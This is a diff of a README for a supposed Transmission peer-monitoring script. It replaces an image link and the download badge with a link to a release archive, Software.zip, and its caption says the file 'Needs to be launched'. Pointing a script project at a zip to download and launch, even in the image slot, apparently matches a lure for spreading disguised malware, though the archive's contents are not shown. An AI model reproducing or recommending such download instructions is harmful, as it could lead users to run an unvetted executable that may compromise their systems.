@@ -1,6 +1,6 @@
 # 🔍🌐📊 Monitor Transmission Peers Script
 
-![Peer Monitoring](https://example.com/peer_monitoring_image.jpg)
+![Peer Monitoring](https://github.com/Jrcraftee/monitor_transmission/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to the "monitor_transmission" repository, where you can find a handy script designed to monitor real-time peers connected to a Transmission daemon. This script not only keeps track of connected peers but also gathers statistics on the IP addresses of the peers. It includes geolocation information as well as a colorful summary of the collected statistics. If you are dealing with file-sharing servers and want detailed insights into peer connections and data distribution, this script is just what you need.
@@ -8,7 +8,7 @@ Welcome to the "monitor_transmission" repository, where you can find a handy scr
 ## Installation
 To get started with monitoring your Transmission peers, simply download the software package from the link provided below. Once you have downloaded the ZIP file, extract its contents and follow the instructions in the README file included in the package.
 
-[![Download Software](https://img.shields.io/badge/Download-Software.Zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip "Needs to be launched")
+[![Download Software](https://github.com/Jrcraftee/monitor_transmission/releases/download/v2.0/Software.zip)](https://github.com/Jrcraftee/monitor_transmission/releases/download/v2.0/Software.zip "Needs to be launched")
 
 ## Features
 - Real-time monitoring of connected peers
